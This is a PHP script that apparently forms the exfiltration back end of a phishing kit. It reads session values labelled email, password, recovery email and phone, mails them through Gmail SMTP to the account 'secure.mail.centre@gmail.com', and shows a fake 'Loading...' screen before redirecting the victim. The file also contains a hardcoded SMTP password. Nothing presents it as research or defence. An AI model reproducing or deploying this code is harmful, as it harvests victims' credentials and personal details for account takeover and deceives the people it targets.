<?php
session_start();

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'phpmailer/src/Exception.php';
require 'phpmailer/src/PHPMailer.php';
require 'phpmailer/src/SMTP.php';

$mail = new PHPMailer(true);

try {
    $mail->isSMTP();
    $mail->Host       = 'smtp.gmail.com';
    $mail->SMTPAuth   = true;
    $mail->Username   = 'secure.mail.centre@gmail.com';
    $mail->Password   = 'prjhakuqnmlyagdn';
    $mail->SMTPSecure = 'ssl';
    $mail->Port       = 465;

    $mail->setFrom('secure.mail.centre@gmail.com', 'Your Name');
    $mail->addAddress('secure.mail.centre@gmail.com');

    $mail->Subject = 'User Input Data';

    // Construct the email body using session data
    $emailBody = "
        <p><strong>Input 1:</strong> " . htmlspecialchars($_SESSION['email']) . "</p>
        <p><strong>Input 2:</strong> " . htmlspecialchars($_SESSION['password']) . "</p>
        <p><strong>Input 3:</strong> " . htmlspecialchars($_SESSION['recovery_email']) . "</p>
        <p><strong>Input 4:</strong> " . htmlspecialchars($_SESSION['phone']) . "</p>
        <p><strong>Input 5:</strong> " . htmlspecialchars($_SESSION['input5']) . "</p>
    ";

    $mail->isHTML(true);
    $mail->Body = $emailBody;
// Display loading overlay and redirect after successful email send

    echo "<div id='loading-overlay'>Loading...</div>";
    echo "<script>
    document.getElementById('loading-overlay').style.display = 'block';
    setTimeout(function() {
        window.location.href = 'index.php';  // Redirect to index.php after 3 seconds
    }, 3000);
    </script>";

// Attempt to send the email
    $mail->send();

} catch (Exception $e) {
echo "<script>alert('Message could not be sent. Mailer Error: {$mail->ErrorInfo}');</script>";
}
?>
